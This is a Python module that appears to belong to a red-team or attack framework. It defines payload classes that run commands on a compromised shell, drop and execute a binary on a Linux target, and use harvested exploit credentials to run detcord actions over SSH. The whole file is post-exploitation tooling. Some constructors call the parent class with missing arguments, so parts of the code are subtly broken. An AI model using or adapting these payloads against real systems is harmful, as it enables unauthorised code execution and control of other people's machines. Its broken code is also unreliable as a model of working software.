# parent class for all payloads
from inspect import getmembers


class payload_class():

	def __init__(self,shell,args,exploit):
		self.shell = shell
		self.args = args
		self.exploit = exploit

	def execute_payload(self):
		pass

# execute a command
class command(payload_class):

	def __init__(self,shell,args):
		payload_class.__init__(self,shell)
		self.command = args['command']

	def execute_payload(self):
		self.shell.execute(self.command)

# drop a payload from this machine to target
class send_exec_bin_lin(payload_class):

	def __init__(self,shell,args,exploit):
		payload_class.__init__(self,shell)
		self.payload_name = args['payload_name']
		self.dir_path = args['dir_path']

	def execute_payload(self):
		self.shell.drop_payload_linux(self.payload_name,self.dir_path)
		self.shell.execute('cd '+self.dir_path)
		self.shell.execute('./'+self.payload_name)

class detcord_file(payload_class):

	def __init__(self,shell,args,exploit):
		payload_class.__init__(self,shell,args,exploit)
		from detcord import CONNECTION_MANAGER
		self.shell = shell
		self.args = args
		self.function = self.args['function']
		self.host = {
			"ip": exploit.ip,
			"user": exploit.username,
			"password": exploit.password
		}
		self.detfile = __import__('detfiles.example',fromlist=self.args['file'])
		self.func = getattr(self.detfile, self.function)
		CONNECTION_MANAGER.add_host(host=self.host['ip'],user=self.host['user'],password=self.host['password'])
		CONNECTION_MANAGER.set_ssh_connection(self.exploit.ip, shell.get_shell())



	def execute_payload(self):
		from detcord.loader import run_action
		run_action(self.func, self.host)

